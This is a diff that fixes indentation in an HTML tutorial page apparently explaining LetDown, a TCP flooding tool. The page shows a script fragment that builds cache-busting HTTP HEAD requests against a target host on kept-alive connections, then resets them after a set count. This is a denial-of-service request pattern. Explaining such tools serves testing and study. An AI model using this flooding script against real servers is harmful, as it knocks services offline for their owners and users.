@@ -114,24 +114,24 @@ user_agent <span style="color:#808030;">=</span> <span style="color:#0000e6;">"M
   
 <span style="color:#800000;font-weight:bold;">if</span> count <span style="color:#808030;">&lt;</span> max_requests_per_connection<span style="color:#808030;">:</span>
   
-<span style="color:#696969;"># packet settings</span>
-flags   <span style="color:#808030;">=</span> ack
-window  <span style="color:#808030;">=</span> <span style="color:#008c00;">1024</span>
-action  <span style="color:#808030;">=</span> act_wait
+    <span style="color:#696969;"># packet settings</span>
+    flags   <span style="color:#808030;">=</span> ack
+    window  <span style="color:#808030;">=</span> <span style="color:#008c00;">1024</span>
+    action  <span style="color:#808030;">=</span> act_wait
   
-<span style="color:#696969;"># HTTP request</span>
-payload  <span style="color:#808030;">=</span> <span style="color:#0000e6;">"HEAD "</span> <span style="color:#808030;">+</span> target_query<span style="color:#808030;">.</span>replace<span style="color:#808030;">(</span><span style="color:#0000e6;">'%rand%'</span><span style="color:#808030;">,</span><span style="color:#e34adc;">str</span><span style="color:#808030;">(</span>random<span style="color:#808030;">.</span>getrandbits<span style="color:#808030;">(</span><span style="color:#008c00;">20</span><span style="color:#808030;">)</span><span style="color:#808030;">)</span><span style="color:#808030;">)</span> <span style="color:#808030;">+</span> <span style="color:#0000e6;">" HTTP/1.1\r\n"</span>
-payload <span style="color:#808030;">+</span><span style="color:#808030;">=</span> <span style="color:#0000e6;">"Host: "</span> <span style="color:#808030;">+</span> target_host <span style="color:#808030;">+</span> <span style="color:#0000e6;">"\r\n"</span>
-payload <span style="color:#808030;">+</span><span style="color:#808030;">=</span> <span style="color:#0000e6;">"User-Agent: "</span> <span style="color:#808030;">+</span> user_agent <span style="color:#808030;">+</span> <span style="color:#0000e6;">"\r\n"</span>
-payload <span style="color:#808030;">+</span><span style="color:#808030;">=</span> <span style="color:#0000e6;">"Connection: Keep-Alive\r\n\r\n"</span>
+    <span style="color:#696969;"># HTTP request</span>
+    payload  <span style="color:#808030;">=</span> <span style="color:#0000e6;">"HEAD "</span> <span style="color:#808030;">+</span> target_query<span style="color:#808030;">.</span>replace<span style="color:#808030;">(</span><span style="color:#0000e6;">'%rand%'</span><span style="color:#808030;">,</span><span style="color:#e34adc;">str</span><span style="color:#808030;">(</span>random<span style="color:#808030;">.</span>getrandbits<span style="color:#808030;">(</span><span style="color:#008c00;">20</span><span style="color:#808030;">)</span><span style="color:#808030;">)</span><span style="color:#808030;">)</span> <span style="color:#808030;">+</span> <span style="color:#0000e6;">" HTTP/1.1\r\n"</span>
+    payload <span style="color:#808030;">+</span><span style="color:#808030;">=</span> <span style="color:#0000e6;">"Host: "</span> <span style="color:#808030;">+</span> target_host <span style="color:#808030;">+</span> <span style="color:#0000e6;">"\r\n"</span>
+    payload <span style="color:#808030;">+</span><span style="color:#808030;">=</span> <span style="color:#0000e6;">"User-Agent: "</span> <span style="color:#808030;">+</span> user_agent <span style="color:#808030;">+</span> <span style="color:#0000e6;">"\r\n"</span>
+    payload <span style="color:#808030;">+</span><span style="color:#808030;">=</span> <span style="color:#0000e6;">"Connection: Keep-Alive\r\n\r\n"</span>
   
-<span style="color:#696969;">#</span>
-<span style="color:#696969;"># Close the connection</span>
-<span style="color:#696969;">#</span>
+    <span style="color:#696969;">#</span>
+    <span style="color:#696969;"># Close the connection</span>
+    <span style="color:#696969;">#</span>
   
 <span style="color:#800000;font-weight:bold;">else</span><span style="color:#808030;">:</span>
-flags   <span style="color:#808030;">=</span> rst
-action  <span style="color:#808030;">=</span> act_wait
+    flags   <span style="color:#808030;">=</span> rst
+    action  <span style="color:#808030;">=</span> act_wait
       </pre>
       
       <p>As you can see we did not need to program anything to manage the connection. These tasks are entirely managed by LetDown, via raw sockets and libpcap.</p>
